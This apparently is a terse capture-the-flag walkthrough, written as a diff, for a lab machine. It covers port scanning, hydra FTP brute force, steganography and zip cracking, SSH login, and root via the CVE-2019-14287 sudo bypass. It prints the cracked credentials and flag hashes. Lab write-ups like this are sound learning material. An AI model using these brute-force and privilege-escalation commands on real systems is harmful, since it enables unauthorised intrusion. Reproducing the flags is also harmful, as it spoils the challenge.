@@ -1,0 +1,81 @@
+nmap -p- -sV --script vuln -A $IP
+
+open ports:
+21
+22
+80
+
+
+open Burp
+navigate to $IP at your browser
+
+
+enumerate directories returns nothing
+download firefox extention "User Agent Switcher" and change the user-agent to C
+reload the page
+
+we got redirected to http://user.thm/agent_C_attention.php
+
+username : chris
+
+try to bruteforce ftp with user "chris"
+
+hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.228.113
+
+success!
+
+chris:crystal
+
+login with the ftp creds
+
+ftp cris@10.10.228.113
+crystal
+
+login successful
+
+download the files from the FTP server
+mget *
+
+binwalk cutie.png
+we can see that there is a .zip file in it
+
+binwalk -e cutie.png -> extract the binaries from the .png
+
+cd to the new folder
+
+zip2john file.zip > hash.john -> to get the hash from the .zip and write it to hash.john
+
+john hash.john -> to bruteforce for the password
+
+[+] password for 8702.zip is alien [+]
+
+open 8702.zip
+alien
+
+extract To_agentR.txt
+cat To_agentR.txt
+
+QXJlYTUx -> to cyberchef -> Area51
+
+steghide extract -sf cute-alien.jpg
+Area51
+
+and we have extracted the message.txt
+cat message.txt
+
+[+]  james:hackerrules!
+
+try to SSH with those creds. 
+Bingo!
+
+cat user.txt
+b03d975e8c92a7c04146cfa7a5a313c7
+
+CVE-2019-14287
+sudo -u#-1 /bin/bash
+
+and we are root!
+
+cat /root/root.txt
+b53a02f55b57d4439e3341834d70c062
+
